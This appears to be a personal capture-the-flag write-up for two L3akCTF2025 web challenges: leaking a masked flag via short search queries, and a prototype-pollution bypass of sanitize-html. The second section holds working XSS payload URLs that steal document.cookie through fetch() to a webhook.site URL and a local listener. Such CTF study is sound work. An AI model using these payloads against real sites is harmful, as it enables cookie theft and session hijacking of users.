---
date: 2025-07-20
description: Prototype pollution example
platform: L3akCTF2025
categories: Web
tags:
  - prototype-pollution
  - xss
---

# Web
## flag_l3ak
Search for flag 
```js
  .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        ).map(post => ({
			...post,
			content: post.content.replace(FLAG, '*'.repeat(FLAG.length))

```
query length must be 3 
replaces the content but its still returned in search
`L3A` > returns the flag masked
`3AK` > returns the flag masked
`AK{` > returns the flag masked 

> issue that it might match other content be sure to match the title as well 
challenge about leaking the content of masked data, by doing few characters at the time, 

## NotoriousNote
Prototype pollution leading to manipulation of sanitize-html. 

expoit 
```
http://localhost:5000/?__proto__[*]=[%27onload%27]&note=%3Ciframe+onload=fetch(`https://webhook.site/ef0c35e5-4ab8-4993-84c7-f9167db5e213?cookie=${btoa(document.cookie)}`%3E%3C/iframe%3E

http://localhost:5000/?__proto__[*]=[%27onload%27,%27fetch%27]&note=%3Ciframe+onload=%22alert(1);fetch(`http://localhost:8901%3Fcookie%3D${btoa(document.cookie)}`)%22%3E%3C/iframe%3E

http%3A%2F%2Flocalhost%3A5000%2F%3F__proto__%5B%2A%5D%3D%5B%2527onload%2527%2C%2527fetch%2527%5D%26note%3D%253Ciframe%2Bonload%3D%2522alert%281%29%3Bfetch%28%60http%3A%2F%2Flocalhost%3A8901%253Fcookie%253D%24%7Bbtoa%28document.cookie%29%7D%60%29%2522%253E%253C%2Fiframe%253E
```

reference: 
https://www.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers.html
![[Pasted image 20250713052619.png]]
![[Pasted image 20250713052435.png]]
